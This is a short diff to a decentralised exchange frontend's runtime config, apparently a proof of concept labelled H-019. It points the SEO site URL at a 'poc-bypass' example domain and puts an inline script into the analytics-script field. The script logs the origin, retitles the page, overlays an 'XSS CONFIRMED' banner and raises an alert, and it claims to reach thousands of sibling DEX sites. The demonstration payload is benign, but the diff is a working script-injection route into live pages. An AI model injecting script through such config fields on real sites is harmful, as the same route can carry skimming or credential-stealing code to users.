@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/h019-poc-1779847180-9214/",
+  "VITE_SEO_SITE_URL": "https://poc-bypass-1779847191.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>console.log(\"[H-019] XSS chain validated. origin=\",location.origin);document.title=\"VULN-CONFIRMED-H019-\"+Date.now();var d=document.createElement(\"div\");d.id=\"h019banner\";d.style.cssText=\"position:fixed;top:0;left:0;right:0;background:#c00;color:#fff;padding:24px;font:bold 22px sans-serif;z-index:2147483647;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.4)\";d.innerText=\"[H-019] XSS CONFIRMED on \"+location.origin+\" - shared with 2978+ sibling DEXs\";document.documentElement.appendChild(d);alert(\"H-019 XSS on \"+location.origin);</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
